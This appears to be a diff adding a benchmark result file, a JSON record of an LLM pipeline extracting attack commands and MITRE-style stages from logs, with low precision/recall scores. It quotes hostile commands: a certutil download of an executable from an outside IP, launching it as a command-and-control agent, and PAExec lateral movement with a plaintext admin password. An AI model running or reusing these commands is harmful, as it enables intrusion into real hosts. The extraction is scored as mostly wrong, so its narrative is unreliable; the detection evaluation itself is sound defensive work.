@@ -1,0 +1,88 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil  -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd  /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Execution"
+      },
+      {
+        "command": "reg.exe  ADD ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c  PAExec.exe \\\\192.168.0.95 -u administrator -p Data123456!",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /c  PAExec.exe \\\\192.168.0.244 -u administrator -p Data123456!",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "An attacker initially accessed the host using `certutil` to download an executable, then established command and control over the host via the downloaded agent. The attacker executed various commands on the host using PowerShell, escalated privileges by modifying registry settings, evaded defenses by bypassing execution policy restrictions, gathered information about the host, moved laterally to other hosts using PAExec, and ultimately gained access to sensitive resources.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 66267,
+      "completion_tokens": 723,
+      "total_tokens": 66990,
+      "wall_clock_s": 15.371,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2222222222222222,
+      "recall": 0.3333333333333333,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 7,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.2222222222222222,
+      "recall": 0.3333333333333333,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 7,
+      "fn": 4,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 66267,
+      "completion_tokens": 723,
+      "total_tokens": 66990,
+      "wall_clock_s": 15.371,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
